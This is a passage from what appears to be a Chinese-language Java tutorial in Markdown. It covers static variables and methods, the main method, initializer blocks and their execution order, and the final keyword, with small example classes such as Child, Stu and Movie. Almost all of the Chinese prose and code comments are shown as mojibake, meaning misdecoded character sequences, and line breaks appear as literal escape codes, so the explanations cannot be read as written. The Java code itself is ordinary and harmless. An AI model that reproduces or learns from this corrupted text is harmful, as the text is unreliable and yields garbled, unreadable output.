·ä»»ä½•ä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡å»ä¿®æ”¹å®ƒæ—¶ï¼Œä¿®æ”¹çš„ä¹Ÿæ˜¯åŒä¸€ä¸ªå˜é‡ã€‚\n\n#### **ç±»å˜é‡å†…å­˜å¸ƒå±€**\n\n- jdk8 åŠä»¥å‰ç‰ˆæœ¬ï¼Œæ”¾åœ¨é™æ€åŸŸï¼›\n\n- jdk8 ä»¥åç‰ˆæœ¬ï¼Œæ”¾åœ¨å †ä¸­ï¼Œå½“ä½ çš„ç±»åŠ è½½çš„æ—¶å€™ä¼šåœ¨å †ä¸­ç”Ÿæˆä¸€ä¸ªç±»çš„ class å¯¹è±¡ï¼Œé™æ€å˜é‡å°±åœ¨ class å¯¹è±¡å°¾éƒ¨ã€‚\n\n#### ç±»å˜é‡ç‰¹ç‚¹\n\n- ç±»å˜é‡æ˜¯åŒä¸€ä¸ªç±»æ‰€æœ‰å¯¹è±¡å®ä¾‹å…±äº«çš„\n- ç±»å˜é‡ï¼Œåœ¨ç±»åŠ è½½çš„æ—¶å€™å°±ç”Ÿæˆäº†\n  - **(å³ç±»åŠ è½½çš„æ—¶å€™å°±ä¼šåˆå§‹åŒ–ç±»å˜é‡ï¼Œå³ä½¿æ²¡æœ‰åˆ›å»ºç±»å¯¹è±¡å®ä¾‹ä¹Ÿå¯é€šè¿‡ç±»åè®¿é—®)**\n- ç±»å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯éšç±»çš„åŠ è½½å¼€å§‹ï¼Œéšç€ç±»çš„æ¶ˆäº¡è€Œé”€æ¯ã€‚\n\n#### ç±»å˜é‡çš„å®šä¹‰\n\n- è®¿é—®ä¿®é¥°ç¬¦ static æ•°æ®ç±»å‹ å˜é‡åã€æ¨èä½¿ç”¨ã€‘\n- static  è®¿é—®ä¿®é¥°ç¬¦ æ•°æ®ç±»å‹ å˜é‡å\n\n#### ç±»å˜é‡çš„è®¿é—®\n\n- ç±»å.ç±»å˜é‡åã€æ¨èä½¿ç”¨ã€‘\n- å¯¹è±¡å.ç±»å˜é‡å\n\n#### ç±»å˜é‡ä½¿ç”¨åœºæ™¯\n\nå½“æˆ‘ä»¬éœ€è¦è®©æŸä¸ªç±»çš„æ‰€æœ‰å¯¹è±¡éƒ½å…±äº«ä¸€ä¸ªå˜é‡æ—¶ï¼Œå°±å¯ä»¥è€ƒè™‘ä½¿ç”¨ç±»å˜é‡(é™æ€å˜é‡)ã€‚æ¯”å¦‚:å®šä¹‰å­¦ç”Ÿç±»ï¼Œç»Ÿè®¡æ‰€æœ‰å­¦ç”Ÿå…±äº¤å¤šå°‘é’±ã€‚Student (name, static fee)\n\n#### ç±»å˜é‡ä¸æ™®é€šå˜é‡\n\n- ç±»å˜é‡æ˜¯è¯¥ç±»çš„æ‰€æœ‰å¯¹è±¡å…±äº«çš„\n- å®ä¾‹å˜é‡(æ™®é€šå˜é‡/ç±»æˆå‘˜å˜é‡/éé™æ€å˜é‡)æ˜¯æ¯ä¸ªå¯¹è±¡ç‹¬äº«çš„\n\n#### ä»£ç ç†è§£ç±»å˜é‡\n\n```java\npublic class ChildGame {\n    public static void main(String[] args) {\n        //æ™®é€šæ–¹æ³•éœ€å®šä¹‰ä¸€ä¸ªå˜é‡ count, ç»Ÿè®¡æœ‰å¤šå°‘å°å­©åŠ å…¥äº†æ¸¸æˆ\n        //int count = 0;\n        Child child1 = new Child(\"ç™½éª¨ç²¾\");\n        child1.join();\n        //count++;\n        child1.count++;\n        Child child2 = new Child(\"ç‹ç‹¸ç²¾\");\n        child2.join();\n        //count++;\n        child2.count++;\n        Child child3 = new Child(\"è€é¼ ç²¾\");\n        child3.join();\n        //count++;\n        child3.count++;\n\n        //ç±»å˜é‡ï¼Œå¯ä»¥é€šè¿‡ç±»åæ¥è®¿é—®,ä¹Ÿå¯é€šè¿‡å¯¹è±¡åè®¿é—®\n        System.out.println(\"å…±æœ‰\" + Child.count + \" å°å­©åŠ å…¥äº†æ¸¸æˆ...\");\n        System.out.println(\"child1.count=\" + child1.count);//3\n        System.out.println(\"child2.count=\" + child2.count);//3\n        System.out.println(\"child3.count=\" + child3.count);//3\n    }\n}\n\nclass Child {\n    private String name;\n    public static int count = 0;  //è¯¥å˜é‡æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯ä¼šè¢« Child ç±»çš„æ‰€æœ‰çš„å¯¹è±¡å®ä¾‹å…±äº«\n    public Child(String name) {\n        this.name = name;\n    }\n    public void join() {\n        System.out.println(name + \" åŠ å…¥äº†æ¸¸æˆ..\");\n    }\n}\n```\n\n### ç±»æ–¹æ³•(é™æ€æ–¹æ³•)\n\n> ç±»æ–¹æ³•ï¼Œæ— éœ€åˆ›å»ºç±»çš„å¯¹è±¡å³å¯å¯¹å…¶è¿›è¡Œè®¿é—®\n\n#### ç±»æ–¹æ³•å®šä¹‰\n\n- è®¿é—®ä¿®é¥°ç¬¦ static æ•°æ®è¿”å›ç±»å‹ æ–¹æ³•å(){}ã€æ¨èä½¿ç”¨ã€‘\n- static  è®¿é—®ä¿®é¥°ç¬¦ æ•°æ®è¿”å›ç±»å‹ æ–¹æ³•å(){}\n\n#### ç±»æ–¹æ³•è®¿é—®\n\n- ç±»å.ç±»æ–¹æ³•åã€æ¨èä½¿ç”¨ã€‘\n- å¯¹è±¡å.ç±»æ–¹æ³•å\n\n#### ç±»æ–¹æ³•ä½¿ç”¨åœºæ™¯\n\n- å½“æ–¹æ³•ä¸­ä¸æ¶‰åŠåˆ°ä»»ä½•å’Œå¯¹è±¡ç›¸å…³çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥å°†æ–¹æ³•è®¾è®¡æˆé™æ€æ–¹æ³•ï¼Œæé«˜å¼€å‘æ•ˆç‡ã€‚\n- æ¯”å¦‚å·¥å…·ç±»ä¸­çš„æ–¹æ³• Utilsï¼Œ Mathç±»ã€Arraysç±»ã€Collectionsé›†åˆç±»\n- åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¾€å¾€å°†ä¸€äº›é€šç”¨çš„æ–¹æ³•ï¼Œè®¾è®¡æˆé™æ€æ–¹æ³•ï¼Œè¿™æ ·æˆ‘ä»¬ä¸éœ€è¦åˆ›å»ºå¯¹è±¡å°±å¯ä»¥ä½¿ç”¨ï¼Œæ¯”å¦‚æ‰“å°ä¸€ç»´æ•°ç»„ï¼Œå†’æ³¡æ’åºç­‰ç­‰\n\n#### ç±»æ–¹æ³•ä¸æ™®é€šæ–¹æ³•\n\n- ç±»æ–¹æ³•å’Œæ™®é€šæ–¹æ³•éƒ½æ˜¯éšç€ç±»çš„åŠ è½½è€ŒåŠ è½½ï¼Œå°†ç»“æ„ä¿¡æ¯å­˜å‚¨åœ¨æ–¹æ³•åŒºï¼šç±»æ–¹æ³•ä¸­æ—  this çš„å‚æ•°ï¼Œæ™®é€šæ–¹æ³•ä¸­éšå«ç€ this çš„å‚æ•°ã€‚\n- ç±»æ–¹æ³•å¯ä»¥é€šè¿‡ç±»åæˆ–å¯¹è±¡åè°ƒç”¨ï¼Œè€Œæ™®é€šæ–¹æ³•åªèƒ½é€šè¿‡å¯¹è±¡åè°ƒç”¨ã€‚\n- ç±»æ–¹æ³•ä¸­ä¸å…è®¸ä½¿ç”¨å’Œå¯¹è±¡æœ‰å…³çš„å…³é”®å­—ï¼Œæ¯”å¦‚ `this` ã€`super`ï¼›æ™®é€šæ–¹æ³•å¯ä»¥ã€‚ï¼ˆå› ä¸ºå½“ç”¨`ç±»å.ç±»æ–¹æ³•å`è°ƒç”¨çš„æ—¶å€™ï¼Œthis å’Œ super æŒ‡ç¤ºä¸æ˜ï¼‰\n- ç±»æ–¹æ³•ä¸­åªèƒ½è®¿é—®é™æ€å˜é‡æˆ–é™æ€æ–¹æ³•ï¼›è€Œæ™®é€šæ–¹æ³•æ—¢å¯ä»¥è®¿é—®æ™®é€šå˜é‡ï¼ˆæ–¹æ³•ï¼‰ï¼Œä¹Ÿå¯ä»¥è®¿é—®é™æ€å˜é‡ï¼ˆæ–¹æ³•ï¼‰ã€‚\n- ç±»æ–¹æ³•å¯ä»¥è¢«å­ç±»ç»§æ‰¿ï¼Œä½†æ˜¯ä¸èƒ½è¢«å­ç±»é‡å†™\n\n####  ä»£ç ç†è§£ç±»æ–¹æ³•\n\n```java\npackage com.jwt.static_;\n\npublic class StaticMethod {\n    public static void main(String[] args) {\n        //åˆ›å»ºä¸¤ä¸ªå­¦ç”Ÿäº¤å­¦è´¹\n        Stu tom = new Stu(\"Tom\");\n        tom.payFee(100);\n        Stu mary = new Stu(\"mary\");\n        mary.payFee(200);\n        Stu.showFee();\n    }\n}\n\nclass Stu{\n    private String name;\n    private static  double fee = 0;//é™æ€å˜é‡ç´¯ç§¯å­¦è´¹\n    public Stu(String name) {\n        this.name = name;\n    }\n    public static void payFee(double fee){//é™æ€æ–¹æ³•å¯è®¿é—®é™æ€å˜é‡\n        Stu.fee += fee;\n    }\n    public static void showFee(){\n        System.out.println(\"æ€»å­¦è´¹ï¼š\" + Stu.fee);\n    }\n}\n```\n\n### mainæ–¹æ³•\n\n#### æ·±å…¥ç†è§£mainæ–¹æ³•\n\nmain æ–¹æ³•çš„å½¢å¼: `public static void main(String[] args){}`\n\n- **publicï¼š**main æ–¹æ³•æ˜¯ JVM è°ƒç”¨çš„ï¼Œè¯¥æ–¹æ³•çš„è®¿é—®æƒé™å¿…é¡»æ˜¯ publicï¼›\n\n- **staticï¼š**Javaè™šæ‹Ÿæœºåœ¨æ‰§è¡Œmain()æ–¹æ³•æ—¶ä¸å¿…åˆ›å»ºå¯¹è±¡ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•å¿…é¡»æ˜¯ staticï¼›\n\n- **argsï¼š**è¯¥æ–¹æ³•æ¥æ”¶ String ç±»å‹çš„æ•°ç»„å‚æ•°ï¼Œè¯¥æ•°ç»„ä¸­ä¿å­˜æ‰§è¡Œ Java å‘½ä»¤æ—¶ä¼ é€’ç»™æ‰€è¿è¡Œçš„ç±»çš„å‚æ•°\n\n  | ![](https://img.jwt1399.top/img/202111082204040.png) | ![](https://img.jwt1399.top/img/202111082204894.png) |\n  | ---------------------------------------------------- | ---------------------------------------------------- |\n\n#### ç‰¹åˆ«æ³¨æ„\n\n- åœ¨ main() æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨ main æ–¹æ³•æ‰€åœ¨ç±»çš„é™æ€æ–¹æ³•æˆ–é™æ€å±æ€§ã€‚\n\n- ä½†æ˜¯ï¼Œä¸èƒ½ç›´æ¥è®¿é—®è¯¥ç±»ä¸­çš„éé™æ€æˆå‘˜ï¼Œå¿…é¡»åˆ›å»ºè¯¥ç±»çš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡åï¼Œæ‰èƒ½é€šè¿‡è¿™ä¸ªå¯¹è±¡å»è®¿é—®ç±»ä¸­çš„éé™æ€æˆå‘˜ã€‚\n\n#### IDEA ä¸­ç»™mainä¼ å‚æ•°\n\n| ç¬¬ä¸€æ­¥                                               | ç¬¬äºŒæ­¥                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202111082222881.png) | ![](https://img.jwt1399.top/img/202111082222273.png) |\n\n### ä»£ç å—\n\n#### ç®€ä»‹\n\nä»£ç å—åˆç§°ä¸º **åˆå§‹åŒ–å—**ï¼Œå±äºç±»ä¸­çš„æˆå‘˜ï¼Œç±»ä¼¼äºæ–¹æ³•ï¼Œå°†é€»è¾‘è¯­å¥å°è£…åœ¨æ–¹æ³•ä½“ä¸­ï¼Œé€šè¿‡ { } åŒ…å›´èµ·æ¥ï¼Œä½†å’Œæ–¹æ³•ä¸åŒï¼Œæ²¡æœ‰æ–¹æ³•åï¼Œæ²¡æœ‰è¿”å›ï¼Œæ²¡æœ‰å‚æ•°ï¼Œåªæœ‰æ–¹æ³•ä½“ï¼Œè€Œä¸”ä¸ç”¨é€šè¿‡å¯¹è±¡æˆ–ç±»æ˜¾å¼è°ƒç”¨ï¼Œè€Œæ˜¯åŠ è½½ç±»æ—¶æˆ–åˆ›å»ºå¯¹è±¡æ—¶éšå¼è°ƒç”¨ã€‚\n\n#### ä»£ç å—è¯­æ³•\n\n```java\n[ä¿®é¥°ç¬¦]{\n\tè¿™é‡Œæ˜¯ä»£ç ï¼›\n};\n```\n\n**è¯´æ˜ï¼š**\n\n- ä¿®é¥°ç¬¦å¯é€‰ï¼Œè¦å†™çš„è¯ï¼Œä¹Ÿåªèƒ½å†™ static\n- ä»£ç å—åˆ†ä¸ºä¸¤ç±»ï¼Œä½¿ç”¨ static ä¿®é¥°çš„å«é™æ€ä»£ç å—ï¼Œæ²¡æœ‰ static ä¿®é¥°çš„ï¼Œå«æ™®é€šä»£ç å—\n-  å—ä¸­ä»£ç å¯ä»¥ä¸ºä»»ä½•é€»è¾‘è¯­å¥ï¼ˆè¾“å…¥ã€è¾“å‡ºã€æ–¹æ³•è°ƒç”¨ã€å¾ªç¯ã€åˆ¤æ–­ç­‰ï¼‰\n- åˆ†å·ï¼Œå¯ä»¥å†™ä¸Šï¼Œä¹Ÿå¯ä»¥çœç•¥\n\n#### ä»£ç å—çš„å¥½å¤„\n\né¦–å…ˆçœ‹ä¸‹é¢ä»£ç ï¼Œä¸‰ä¸ªæ„é€ å™¨éƒ½æœ‰ç›¸åŒçš„è¯­å¥ï¼Œè¿™æ ·ä»£ç çœ‹èµ·æ¥æ¯”è¾ƒå†—ä½™ï¼Œå¦‚ä½•ç®€åŒ–ä»£ç å‘¢ï¼Ÿ\n\n```java\npublic class CodeBlock01 {\n    public static void main(String[] args) {\n        Movie movie = new Movie(\"ä½ å¥½ï¼Œæç„•è‹±\");\n        System.out.println(\"===============\");\n        Movie movie2 = new Movie(\"å”æ¢3\", 100, \"é™ˆæ€è¯š\");\n    }\n}\n\nclass Movie {\n    private String name;\n    private double price;\n    private String director;\n\n    //3ä¸ªæ„é€ å™¨-ã€‹é‡è½½\n    public Movie(String name) {\n        System.out.println(\"ç”µå½±å±å¹•æ‰“å¼€...\");\n        System.out.println(\"å¹¿å‘Šå¼€å§‹...\");\n        System.out.println(\"ç”µå½±æ­£æ˜¯å¼€å§‹...\");\n        System.out.println(\"Movie(String name) è¢«è°ƒç”¨...\");\n        this.name = name;\n    }\n\n    public Movie(String name, double price) {\n        System.out.println(\"ç”µå½±å±å¹•æ‰“å¼€...\");\n        System.out.println(\"å¹¿å‘Šå¼€å§‹...\");\n        System.out.println(\"ç”µå½±æ­£æ˜¯å¼€å§‹...\");\n        this.name = name;\n        this.price = price;\n    }\n\n    public Movie(String name, double price, String director) {\n        System.out.println(\"ç”µå½±å±å¹•æ‰“å¼€...\");\n        System.out.println(\"å¹¿å‘Šå¼€å§‹...\");\n        System.out.println(\"ç”µå½±æ­£æ˜¯å¼€å§‹...\");\n        System.out.println(\"Movie(String name, double price, String director) è¢«è°ƒç”¨...\");\n        this.name = name;\n        this.price = price;\n        this.director = director;\n    }\n}\n```\n\nè¿™æ—¶æˆ‘ä»¬å¯ä»¥æŠŠç›¸åŒçš„è¯­å¥ï¼Œæ”¾å…¥åˆ°ä¸€ä¸ªä»£ç å—ä¸­ï¼Œè¿™æ ·å½“æˆ‘ä»¬**ä¸ç®¡è°ƒç”¨å“ªä¸ªæ„é€ å™¨åˆ›å»ºå¯¹è±¡ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨ä»£ç å—çš„å†…å®¹ï¼Œä»£ç å—è°ƒç”¨çš„é¡ºåºä¼˜å…ˆäºæ„é€ å™¨**\n\n```java\n{\n    System.out.println(\"ç”µå½±å±å¹•æ‰“å¼€...\");\n    System.out.println(\"å¹¿å‘Šå¼€å§‹...\");\n    System.out.println(\"ç”µå½±æ­£æ˜¯å¼€å§‹...\");\n};\n```\n\n**æ”¹è¿›åä»£ç ï¼š**\n\n```java\npublic class CodeBlock01 {\n    public static void main(String[] args) {\n        Movie movie = new Movie(\"ä½ å¥½ï¼Œæç„•è‹±\");\n        System.out.println(\"===============\");\n        Movie movie2 = new Movie(\"å”æ¢3\", 100, \"é™ˆæ€è¯š\");\n    }\n}\n\nclass Movie {\n    private String name;\n    private double price;\n    private String director;\n    \n\t//ä»£ç å—\n    {\n        System.out.println(\"ç”µå½±å±å¹•æ‰“å¼€...\");\n        System.out.println(\"å¹¿å‘Šå¼€å§‹...\");\n        System.out.println(\"ç”µå½±æ­£æ˜¯å¼€å§‹...\");\n    };\n\t//3ä¸ªæ„é€ å™¨-ã€‹é‡è½½\n    public Movie(String name) {\n        System.out.println(\"Movie(String name) è¢«è°ƒç”¨...\");\n        this.name = name;\n    }\n\n    public Movie(String name, double price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    public Movie(String name, double price, String director) {\n        System.out.println(\"Movie(String name, double price, String director) è¢«è°ƒç”¨...\");\n        this.name = name;\n        this.price = price;\n        this.director = director;\n    }\n}\n```\n\n**æ€»ç»“**\n\n- ä»£ç å—ç›¸å½“äºå¦å¤–ä¸€ç§å½¢å¼çš„æ„é€ å™¨ï¼ˆå¯¹æ„é€ å™¨çš„è¡¥å……æœºåˆ¶ï¼‰ï¼Œå¯ä»¥åšåˆå§‹åŒ–çš„æ“ä½œã€‚\n- å¦‚æœå¤šä¸ªæ„é€ å™¨ä¸­éƒ½æœ‰é‡å¤çš„è¯­å¥ï¼Œå¯ä»¥æŠ½å–åˆ°åˆå§‹åŒ–å—ä¸­ï¼Œæé«˜ä»£ç çš„å¤ç”¨æ€§\n\n#### é‡ç‚¹\n\n- static ä»£ç å—ä¹Ÿå«é™æ€ä»£ç å—ï¼Œä½œç”¨å°±æ˜¯å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œè€Œä¸”å®ƒéšç€ç±»çš„åŠ è½½è€Œæ‰§è¡Œï¼Œå¹¶ä¸”åªä¼šæ‰§è¡Œä¸€æ¬¡ã€‚\n\n- ç±»ä»€ä¹ˆæ—¶å€™è¢«åŠ è½½\n  - åˆ›å»ºå¯¹è±¡å®ä¾‹æ—¶ï¼ˆnewï¼‰\n  - åˆ›å»ºå­ç±»å¯¹è±¡å®ä¾‹ï¼Œçˆ¶ç±»ä¹Ÿä¼šè¢«åŠ è½½\n  - ä½¿ç”¨ç±»çš„é™æ€æˆå‘˜æ—¶ï¼ˆé™æ€æ–¹æ³•ï¼Œé™æ€å±æ€§ï¼‰\n\n- æ™®é€šçš„ä»£ç å—ï¼Œåœ¨åˆ›å»ºå¯¹è±¡å®ä¾‹æ—¶ï¼Œä¼šè¢«éšå¼çš„è°ƒç”¨ã€‚è¢«åˆ›å»ºä¸€æ¬¡ï¼Œå°±ä¼šè°ƒç”¨ä¸€æ¬¡ã€‚\n- å¦‚æœåªæ˜¯ä½¿ç”¨ç±»çš„é™æ€æˆå‘˜æ—¶ï¼Œæ™®é€šä»£ç å—å¹¶ä¸ä¼šæ‰§è¡Œã€‚\n\n- åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå®ƒä»¬çš„è°ƒç”¨é¡ºåºæ˜¯ï¼š\n  - â€é¦–å…ˆè°ƒç”¨é™æ€ä»£ç å—å’Œé™æ€å±æ€§åˆå§‹åŒ–ï¼ˆæ³¨æ„ï¼šé™æ€ä»£ç å—å’Œé™æ€å±æ€§åˆå§‹åŒ–è°ƒç”¨çš„ä¼˜å…ˆçº§ä¸€æ ·ï¼Œå¦‚æœæœ‰å¤šä¸ªé™æ€ä»£ç å—å’Œå¤šä¸ªé™æ€å˜é‡åˆå§‹åŒ–ï¼Œåˆ™æŒ‰ä»–ä»¬å®šä¹‰çš„é¡ºåºè°ƒç”¨ï¼‰\n  - âå†è°ƒç”¨æ™®é€šä»£ç å—å’Œæ™®é€šå±æ€§çš„åˆå§‹åŒ–ï¼ˆæ³¨æ„ï¼šæ™®é€šä»£ç å—å’Œæ™®é€šå±æ€§åˆå§‹åŒ–è°ƒç”¨çš„ä¼˜å…ˆçº§ä¸€æ ·ï¼Œå¦‚æœæœ‰å¤šä¸ªæ™®é€šä»£ç å—å’Œå¤šä¸ªæ™®é€šå±æ€§åˆå§‹åŒ–ï¼Œåˆ™æŒ‰å®šä¹‰é¡ºåºè°ƒç”¨ï¼‰\n  - â‚æœ€åè°ƒç”¨æ„é€ æ–¹æ³•ã€‚\n\n- æ„é€ å™¨çš„æœ€å‰é¢å…¶å®éšå«äº† super() å’Œè°ƒç”¨æ™®é€šä»£ç å—ã€‚\n- é™æ€ä»£ç å—åªèƒ½ç›´æ¥è°ƒç”¨é™æ€æˆå‘˜ï¼ˆé™æ€å±æ€§å’Œé™æ€æ–¹æ³•ï¼‰ï¼Œæ™®é€šä»£ç å—å¯ä»¥è°ƒç”¨ä»»æ„æˆå‘˜\n\n- åˆ›å»ºä¸€ä¸ªå­ç±»å¯¹è±¡æ—¶ï¼Œåœ¨ä¸€ä¸ªç±»è°ƒç”¨é¡ºåºæ˜¯ï¼š\n  - â€ çˆ¶ç±»çš„é™æ€ä»£ç å—å’Œé™æ€å±æ€§åˆå§‹åŒ–ï¼ˆä¼˜å…ˆçº§ä¸€æ ·ï¼ŒæŒ‰å®šä¹‰é¡ºåºæ‰§è¡Œï¼‰\n  - â å­ç±»çš„é™æ€ä»£ç å—å’Œé™æ€å±æ€§åˆå§‹åŒ–ï¼ˆä¼˜å…ˆçº§ä¸€æ ·ï¼ŒæŒ‰å®šä¹‰é¡ºåºæ‰§è¡Œï¼‰\n  - â‚ çˆ¶ç±»çš„æ™®é€šä»£ç å—å’Œæ™®é€šå±æ€§åˆå§‹åŒ–ï¼ˆä¼˜å…ˆçº§ä¸€æ ·ï¼ŒæŒ‰å®šä¹‰é¡ºåºæ‰§è¡Œï¼‰\n  - âƒ çˆ¶ç±»çš„æ„é€ æ–¹æ³•\n  - â„ å­ç±»çš„æ™®é€šä»£ç å—å’Œæ™®é€šå±æ€§åˆå§‹åŒ–\n  - â… å­ç±»çš„æ„é€ æ–¹æ³•\n\næ€»ç»“ï¼š\n1â€”â€”æ ¹æ®staticä»£ç å—æ˜¯åœ¨ç±»åŠ è½½æ—¶è¢«è°ƒç”¨ï¼Œå½“è¦åˆ›å»ºå­ç±»è¿™ä¸ªå¯¹è±¡æ—¶ï¼Œå‘ç°è¿™ä¸ªç±»éœ€è¦ä¸€ä¸ªçˆ¶ç±»ï¼Œæ‰€ä»¥æŠŠçˆ¶ç±»çš„ .class åŠ è½½è¿›æ¥ï¼Œæ•…å…ˆæ˜¯çˆ¶ç±»çš„é™æ€ä»£ç å—æˆ–é™æ€å±æ€§åˆå§‹åŒ–ï¼›\n2â€”â€”ç„¶åæ˜¯åŠ è½½å­ç±»çš„ç±»ä¿¡æ¯ï¼Œæ•…æ˜¯å­ç±»çš„é™æ€ä»£ç å—æˆ–é™æ€å±æ€§åˆå§‹åŒ–ï¼›\n3â€”â€”ç„¶åèµ°è¿›å­ç±»æ„é€ å™¨çš„superè¯­å¥ï¼Œè¿›å…¥çˆ¶ç±»çš„æ„é€ å™¨ï¼Œå…ˆsuper()ï¼Œç„¶åè°ƒç”¨çˆ¶ç±»æ™®é€šä»£ç å—ï¼Œæ•…æ˜¯çˆ¶ç±»çš„æ™®é€šä»£ç å—æˆ–æ™®é€šå±æ€§åˆå§‹åŒ–ï¼›\n4â€”â€”ç„¶åçˆ¶ç±»æ„é€ å™¨è°ƒç”¨å®Œæ¯•ï¼Œå³æ˜¯çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼›\n5â€”â€”ç„¶åå›åˆ°å­ç±»çš„æ„é€ æ–¹æ³•ä¸­éšå«çš„è°ƒç”¨æ™®é€šä»£ç å—æˆ–æ™®é€šå±æ€§çš„åˆå§‹åŒ–ï¼›\n6â€”â€”ç„¶åå®Œæˆå­ç±»çš„æ„é€ å™¨ï¼Œæ•…æœ€åæ˜¯å­ç±»çš„æ„é€ æ–¹æ³•ã€‚\n\n### å•ä¾‹æ¨¡å¼\n\n#### é¥¿æ±‰å¼\n\n\n\n#### æ‡’æ±‰å¼\n\n\n\n### finalå…³é”®å­—\n\nfinal åœ¨ Java ä¸­çš„æ„æ€æ˜¯æœ€ç»ˆï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºå®Œç»“å™¨ï¼Œè¡¨ç¤ºå¯¹è±¡æ˜¯æœ€ç»ˆå½¢æ€çš„ï¼Œä¸å¯æ”¹å˜çš„æ„æ€ã€‚final å¯ä»¥ä¿®é¥°ç±»ã€ å±æ€§ã€æ–¹æ³•å’Œå±€éƒ¨å˜é‡ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå°±ä¼šä½¿ç”¨åˆ° final:\n1) å½“ä¸å¸Œæœ›ç±»è¢«ç»§æ‰¿æ—¶ï¼Œå¯ä»¥ç”¨ final ä¿®é¥°\n2) å½“ä¸å¸Œæœ›çˆ¶ç±»çš„æŸä¸ªæ–¹æ³•è¢«å­ç±»è¦†ç›–/é‡å†™(override)æ—¶å¯ä»¥ç”¨ final å…³é”®å­—ä¿®é¥°\n3) å½“ä¸å¸Œæœ›ç±»çš„çš„æŸä¸ªå±æ€§çš„å€¼è¢«ä¿®æ”¹ï¼Œå¯ä»¥ç”¨ final ä¿®é¥°\n4) å½“ä¸å¸Œæœ›æŸä¸ªå±€éƒ¨å˜é‡è¢«ä¿®æ”¹ï¼Œå¯ä»¥ä½¿ç”¨ final ä¿®é¥°\n\n```java\n//1.å¦‚æœæˆ‘ä»¬è¦æ±‚A ç±»ä¸èƒ½è¢«å…¶ä»–ç±»ç»§æ‰¿\n//å¯ä»¥ä½¿ç”¨final ä¿®é¥°A ç±»\nfinal class A {\n}\n\n//class B extends A {}  //ä¼šæŠ¥é”™\n\nclass C {\n    //2.å¦‚æœæˆ‘ä»¬è¦æ±‚hi ä¸èƒ½è¢«å­ç±»é‡å†™\n    //å¯ä»¥ä½¿ç”¨final ä¿®é¥°hi æ–¹æ³•\n    public final void hi() {\n    }\n}\n\nclass D extends C {\n// @Override   //ä¼šæŠ¥é”™\n// public void hi() {\n// System.out.println(\"é‡å†™äº†C ç±»çš„hi æ–¹æ³•..\");\n// }\n}\n\n//3.å½“ä¸å¸Œæœ›ç±»çš„çš„æŸä¸ªå±æ€§çš„å€¼è¢«ä¿®æ”¹,å¯ä»¥ç”¨final ä¿®é¥°\nclass E {\n    public final double TAX_RATE = 0.08;//å¸¸é‡\n}\n\n//4.å½“ä¸å¸Œæœ›æŸä¸ªå±€éƒ¨å˜é‡è¢«ä¿®æ”¹ï¼Œå¯ä»¥ä½¿ç”¨final ä¿®é¥°\nclass F {\n    public void cry() {\n        //è¿™æ—¶ï¼ŒNUM ä¹Ÿç§°ä¸ºå±€éƒ¨å¸¸é‡\n        final double NUM = 0.01;\n        //NUM = 0.9; //ä¼šæŠ¥é”™\n        System.out.println(\"NUM=\" + NUM);\n    }\n}\n```\n\n**æ³¨æ„äº‹é¡¹**\n\n1) final ä¿®é¥°çš„å±æ€§åˆå«å¸¸é‡ï¼Œä¸€èˆ¬ç”¨ XX_XX_XX æ¥å‘½å\n\n2) final ä¿®é¥°çš„å±æ€§åœ¨å®šä¹‰æ—¶ï¼Œå¿…é¡»èµ‹åˆå€¼ï¼Œå¹¶ä¸”ä»¥åä¸èƒ½å†ä¿®æ”¹ï¼Œèµ‹å€¼å¯ä»¥åœ¨å¦‚ä¸‹ä½ç½®ä¹‹ä¸€:\n\n  - â‘ å®šä¹‰æ—¶\n\n  - ```java\n    public final double TAX RATE = 0.08;//å®šä¹‰æ—¶èµ‹å€¼\n    ```\n\n  - â‘¡åœ¨æ„é€ å™¨ä¸­\n\n  - ```java\n    public AA() {//æ„é€ å™¨ä¸­èµ‹å€¼\n    TAX_RATE2 = 1.1;\n    }\n    ```\n\n  - â‘¢åœ¨ä»£ç å—ä¸­\n\n  - ```java\n    {//åœ¨ä»£ç å—èµ‹å€¼\n    TAX_RATE3 = 8.8;\n    }\n    ```\n\n3. final ä¿®é¥°çš„å±æ€§æ˜¯é™æ€çš„ï¼Œåˆ™åˆå§‹åŒ–çš„ä½ç½®åªèƒ½æ˜¯\n\n   - â‘ å®šä¹‰æ—¶ã€åœ¨é™æ€ä»£ç å—\n\n   - ```java\n     public static final double TAX_RATE = 99.9;\n     \n     static {\n     TAX_RATE2 = 3.3;\n     }\n     ```\n\n   - â‘¡ä¸èƒ½åœ¨æ„é€ å™¨ä¸­èµ‹å€¼\n\n\n4. final ç±»ä¸èƒ½ç»§æ‰¿ï¼Œä½†æ˜¯å¯ä»¥å®ä¾‹åŒ–å¯¹è±¡ã€‚\n\n5. å¦‚æœç±»ä¸æ˜¯ final ç±»ï¼Œä½†æ˜¯å«æœ‰ final æ–¹æ³•ï¼Œåˆ™è¯¥æ–¹æ³•è™½ç„¶ä¸èƒ½é‡å†™ï¼Œä½†æ˜¯å¯\n   ä»¥è¢«ç»§æ‰¿ã€‚\n\n6. ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœä¸€ä¸ªç±»å·²ç»æ˜¯ final ç±»äº†ï¼Œå°±æ²¡æœ‰å¿…è¦å†å°†æ–¹æ³•ä¿®é¥°æˆfinalæ–¹æ³•ã€‚\n\n7. final ä¸èƒ½ä¿®é¥°æ„é€ æ–¹æ³•(å³æ„é€ å™¨)ã€‚\n\n8. final å’Œ static å¾€å¾€æ­é…ä½¿ç”¨ï¼Œæ•ˆç‡æ›´é«˜ï¼Œä¸ä¼šå¯¼è‡´ç±»åŠ è½½åº•å±‚ç¼–è¯‘å™¨åšäº†ä¼˜åŒ–å¤„ç†ã€‚\n\n9. åŒ…è£…ç±»(Integer,Double,Float, Booleanç­‰éƒ½æ˜¯ final 